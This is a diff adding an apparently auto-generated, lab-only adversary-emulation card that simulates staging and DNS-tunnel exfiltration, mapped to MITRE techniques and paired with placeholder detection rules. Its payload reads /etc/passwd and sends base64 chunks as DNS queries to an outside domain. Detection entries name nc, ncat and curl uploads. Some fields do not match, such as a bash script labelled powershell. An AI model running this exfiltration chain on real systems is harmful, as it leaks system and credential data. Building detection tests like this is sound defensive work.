@@ -1,0 +1,302 @@
+{
+  "id": "TTP-2026-0048",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-05-20T21:16:12+00:00",
+    "updated_at": "2026-05-20T21:16:12+00:00",
+    "authors": [
+      {
+        "name": "CortexSim generate_card.py",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-analytics",
+      "auto-generated",
+      "skeleton-draft",
+      "severity-high"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": false,
+      "simulation_class": "ransomware-chain",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux",
+        "windows"
+      ],
+      "estimated_runtime_seconds": 120,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Staged Data Exfiltration via DNS Tunneling \u2014 XDR + NGFW Stitch",
+    "summary": "Auto-generated draft from CortexSim scenario SIM-MP-003. Plane: ANALYTICS. Primary technique: T1048.003. Requires human enrichment of BIOC logic + panw_mapping rule_ids.",
+    "description": "Auto-generated draft from CortexSim scenario SIM-MP-003. Plane: ANALYTICS. Primary technique: T1048.003. Requires human enrichment of BIOC logic + panw_mapping rule_ids.\n\nSource scenario: SIM-MP-003.\nUC: Cross-Plane Incident Stitching / TC: Exfiltration Chain - Endpoint Staging Through Network Covert Channel.",
+    "severity": "high",
+    "confidence": "medium"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [],
+    "malware_families": [],
+    "industries_targeted": [
+      "all"
+    ]
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1048",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ],
+        "subtechnique_id": "T1048.003"
+      },
+      {
+        "technique_id": "T1074",
+        "name": "Data Staged: Local Data Staging",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ],
+        "subtechnique_id": "T1074.001"
+      },
+      {
+        "technique_id": "T1572",
+        "name": "Protocol Tunneling",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1005",
+        "name": "Data from Local System",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": []
+  },
+  "execution": {
+    "target_platform": "cross-platform",
+    "execution_framework": "atomic-red-team",
+    "framework_reference_id": "T1048.003 (TODO \u2014 pin atomic test ref)",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Lab environment matching scenario SIM-MP-003 requirements."
+      }
+    ],
+    "payload": {
+      "interpreter": "powershell",
+      "code": "# step-1: Collect sensitive-looking data from endpoint\necho '[MP-003] XDR: local data collection simulating credential harvest';\nmkdir -p /tmp/cortexsim_stage;\necho \"# Simulated credential file - NOT real credentials\" > /tmp/cortexsim_stage/creds.txt;\nfor i in 1 2 3 4 5; do\n  echo \"user$i:simulated-hash-$(openssl rand -hex 16)\" >> /tmp/cortexsim_stage/creds.txt;\ndone;\ncat /etc/passwd | head -20 >> /tmp/cortexsim_stage/creds.txt;\necho '[*] XDR should detect /etc/passwd read + file concatenation pattern'\n# step-2: Stage data in compressed format\necho '[MP-003] XDR: staging compressed tarball';\ntar -czf /tmp/cortexsim_stage/bundle.tar.gz /tmp/cortexsim_stage/creds.txt 2>/dev/null;\nls -la /tmp/cortexsim_stage/;\necho '[*] XDR detects tar+gzip of staging directory (classic exfil prep)'\n# step-3: Exfiltrate staged data over DNS tunnel\necho '[MP-003] NDR: DNS tunneling exfiltration - high volume + high entropy';\nB64=$(base64 -w 0 /tmp/cortexsim_stage/bundle.tar.gz | head -c 2000);\nchunks=$((${#B64} / 60));\nfor i in $(seq 0 $chunks); do\n  chunk=$(echo -n \"$B64\" | cut -c$((i*60+1))-$(((i+1)*60)));\n  [ -z \"$chunk\" ] && break;\n  dig +short TXT \"$(echo -n \"$chunk\" | tr -d = | tr '/+' '-_').exfil.testmynids.org\" @1.1.1.1 > /dev/null || true;\n  sleep 0.5;\ndone;\necho \"[*] Exfiltrated $chunks DNS TXT chunks\"",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching nc (heuristic from scenario step step-01)",
+        "expected_value": "process_name CONTAINS \"nc\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching ncat (heuristic from scenario step step-01)",
+        "expected_value": "process_name CONTAINS \"ncat\""
+      },
+      {
+        "artifact_type": "file",
+        "description": "File access pattern matching '/etc/passwd' (Linux account database) (heuristic from scenario step step-01)",
+        "expected_value": "file_path CONTAINS \"/etc/passwd\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching curl (heuristic from scenario step step-04)",
+        "expected_value": "process_name CONTAINS \"curl\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound HTTP(S) request from the scenario step",
+        "expected_value": "dst_port IN (80, 443) AND src_host = scenario_target"
+      }
+    ],
+    "cleanup": {
+      "interpreter": "powershell",
+      "code": "rm -rf /tmp/cortexsim_stage\necho '[CortexSim] SIM-MP-003 cleanup complete'"
+    }
+  },
+  "detections": {
+    "iocs": [],
+    "biocs": [
+      {
+        "name": "XDR - /etc/passwd read followed by write to /tmp staging directory",
+        "description": "XDR - /etc/passwd read followed by write to /tmp staging directory",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1005\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1005"
+        ]
+      },
+      {
+        "name": "XDR - sensitive-file-path access from non-admin service account",
+        "description": "XDR - sensitive-file-path access from non-admin service account",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1005\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1005"
+        ]
+      },
+      {
+        "name": "XDR - data staging: tar compression of recently-written files in /tmp by service account",
+        "description": "XDR - data staging: tar compression of recently-written files in /tmp by service account",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1074.001\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1074.001"
+        ]
+      },
+      {
+        "name": "NGFW - DNS anomaly: sustained TXT query burst with high-entropy 60-char labels = tunneling signature",
+        "description": "NGFW - DNS anomaly: sustained TXT query burst with high-entropy 60-char labels = tunneling signature",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1048.003\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048.003"
+        ]
+      },
+      {
+        "name": "NGFW - DNS query rate spike: >10x baseline from single source",
+        "description": "NGFW - DNS query rate spike: >10x baseline from single source",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1048.003\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048.003"
+        ]
+      },
+      {
+        "name": "XDR - dig invocation in tight loop from service account (shell one-liner DNS exfil)",
+        "description": "XDR - dig invocation in tight loop from service account (shell one-liner DNS exfil)",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1048.003\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048.003"
+        ]
+      },
+      {
+        "name": "XSIAM stitching - /tmp stage write (XDR) + DNS tunnel burst (NGFW) + same hostname = end-to-end exfiltration...",
+        "description": "XSIAM stitching - /tmp stage write (XDR) + DNS tunnel burst (NGFW) + same hostname = end-to-end exfiltration incident, MTTD measured from stage-to-tunnel",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1048.003\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048.003"
+        ]
+      },
+      {
+        "name": "NGFW - HTTP POST with file upload to IOC-listed domain",
+        "description": "NGFW - HTTP POST with file upload to IOC-listed domain",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1048\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048"
+        ]
+      },
+      {
+        "name": "XDR - curl -F file upload of recently-staged data by service account",
+        "description": "XDR - curl -F file upload of recently-staged data by service account",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1048\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048"
+        ]
+      }
+    ],
+    "xql_queries": [],
+    "correlation_rules": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xsiam",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-ANALYTICS-0048"
+        ],
+        "license_required": "pro"
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-ANALYTICS-0048"
+        ],
+        "license_required": "pro"
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-RANSOM-048",
+        "name": "Cross-Plane Incident Stitching",
+        "description": "Cross-Plane Incident Stitching",
+        "test_cases": [
+          {
+            "test_case_id": "TC-RANSOM-048A",
+            "objective": "TBD \u2014 author concrete pass/fail criteria",
+            "success_criteria": [
+              "TBD \u2014 author at least one verifiable success criterion"
+            ],
+            "expected_score_weight": 1.0
+          }
+        ]
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Unit42 - DNS Tunneling as C2 and Exfil Channel",
+      "url": "https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused/",
+      "publisher": "Unit42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1048.003",
+      "url": "https://attack.mitre.org/techniques/T1048/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-05-20",
+      "author": "CortexSim generate_card.py",
+      "change": "Initial draft auto-generated from scenario SIM-MP-003."
+    }
+  ]
+}
